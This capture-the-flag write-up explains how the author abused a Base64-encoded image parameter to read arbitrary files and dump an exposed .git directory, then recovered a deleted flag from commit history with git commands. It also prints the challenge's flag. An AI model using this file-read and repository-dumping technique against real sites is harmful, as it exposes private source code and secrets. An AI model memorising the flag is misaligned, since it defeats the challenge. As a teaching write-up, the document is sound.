# Write-up: Shrek Fans Only

## Description

### My Story
A simple web page with a single image. too empty!!

But the url of image is somehow interesting (`http://3.91.17.218/getimg.php?img=aW1nMS5qcGc%3D`).
The `img` parameter value is like Base64 encoded value and it is. I tested by Javascript:
```
atob(decodeURIComponent('aW1nMS5qcGc%3D'))
"img1.jpg"
```

I wrote this simple Bash script, [getimg.sh](./getimg.sh), and tried different pathes and finally found `.git` directory files.
```
./getimg.sh ".git/HEAD"
```

OK! I should try to get `.git` directory data and find the flag in the past commits of repository.

### Exploit Time
I had to write a script that would get all parts of `.git` directory, but I didn't know the structure of this directory. I searched and found [this repository](https://github.com/arthaud/git-dumper) and read some parts of [git-dumper.py](https://github.com/arthaud/git-dumper/blob/master/git-dumper.py) and did:
* mkdir git (I made this diretory to be the parent of `.git` directory)
* I wrote [my-dumper.py](./my-dumper.py) to get important files of `.git` directory.

I have these files now:
```
.git/
├── COMMIT_EDITMSG
├── config
├── description
├── HEAD
├── hooks
│   ├── applypatch-msg.sample
│   ├── commit-msg.sample
│   ├── post-commit.sample
│   ├── post-receive.sample
│   ├── post-update.sample
│   ├── pre-applypatch.sample
│   ├── pre-commit.sample
│   ├── prepare-commit-msg.sample
│   ├── pre-push.sample
│   ├── pre-rebase.sample
│   ├── pre-receive.sample
│   └── update.sample
├── index
├── info
│   └── exclude
├── logs
│   ├── HEAD
│   └── refs
│       ├── heads
│       │   └── master
│       └── remotes
│           └── origin
│               └── master
├── objects
│   └── info
└── refs
    ├── heads
    │   └── master
    └── remotes
        └── origin
            └── master
```
There should be some object files under `objects` direcotry that I don't know the names. So I tried to find out the SHA1s all over `.git` directory and used [getobject.sh script](./getobject.sh) to download and put them in the correct path.
```
$ cat .git/logs/HEAD
0000000000000000000000000000000000000000 759be945739b04b63a09e7c02d51567501ead033 Shrek <shrek@shrek.com> 1583366532 +0000	commit (initial): initial commit
759be945739b04b63a09e7c02d51567501ead033 976b625888ae0d9ee9543f025254f71e10b7bcf8 Shrek <shrek@shrek.com> 1583366704 +0000	commit: remove flag
976b625888ae0d9ee9543f025254f71e10b7bcf8 d421c6aa97e8b8a60d330336ec1e829c8ffd7199 Shrek <shrek@shrek.com> 1583367714 +0000	commit: added more stuff
d421c6aa97e8b8a60d330336ec1e829c8ffd7199 759be945739b04b63a09e7c02d51567501ead033 Shrek <shrek@shrek.com> 1583367723 +0000	checkout: moving from master to 759be945739b04b63a09e7c02d51567501ead033
759be945739b04b63a09e7c02d51567501ead033 d421c6aa97e8b8a60d330336ec1e829c8ffd7199 Shrek <shrek@shrek.com> 1583367740 +0000	checkout: moving from 759be945739b04b63a09e7c02d51567501ead033 to master

$ git checkout .
error: unable to read sha1 file of getimg.php (c9566ff84d2e1ae3339bc1e6303d6d3340b5789f)
error: unable to read sha1 file of img1.jpg (0e8104f51db8f9ee08f0966656a3c2307e6cde5c)
error: unable to read sha1 file of index.php (5ab449745b9c25fb0b56c5fbab8d0c986541233e)
Updated 3 paths from the index

$ git fsck --full
broken link from  commit 976b625888ae0d9ee9543f025254f71e10b7bcf8
              to    tree 2f74a95c3a29776d84041f360e64d6e6b2edc7bd
broken link from  commit 759be945739b04b63a09e7c02d51567501ead033
              to    tree aeeea4cfa5afa4dcb70e1d6109790377e7bcec4d
broken link from  commit d421c6aa97e8b8a60d330336ec1e829c8ffd7199
              to    tree e5f40adbab45316c0307505386c3e8f113279b95
missing tree e5f40adbab45316c0307505386c3e8f113279b95
missing tree aeeea4cfa5afa4dcb70e1d6109790377e7bcec4d
missing tree 2f74a95c3a29776d84041f360e64d6e6b2edc7bd
```

I use `git cherry-pick` command to get pre-'remove flag' files.
```
$ git reflog
d421c6a (HEAD -> master, origin/master) HEAD@{0}: checkout: moving from 759be945739b04b63a09e7c02d51567501ead033 to master
759be94 HEAD@{1}: checkout: moving from master to 759be945739b04b63a09e7c02d51567501ead033
d421c6a (HEAD -> master, origin/master) HEAD@{2}: commit: added more stuff
976b625 HEAD@{3}: commit: remove flag
759be94 HEAD@{4}: commit (initial): initial commit

$ git cherry-pick 759be94
```

and after a conflict I saw `index.php` file.
```
$ cat index.php
<!DOCTYPE HTML>
<html>
<head>
<title>Shrek Fanclub</title>
</head>
<body>
<h1>What are you doing in my swamp?</h1>
<img src="imgproxy.php?img=img1.jpg">
<<<<<<< HEAD
<div>There used to be something here but Donkey won't leave me alone<div>
=======
<div>utflag{honey_i_shrunk_the_kids_HxSvO3jgkj}</div>
>>>>>>> 759be94... initial commit
</body>
</html>
```
:sunglasses: You Can See The Conflict!

### Flag
`utflag{honey_i_shrunk_the_kids_HxSvO3jgkj}`
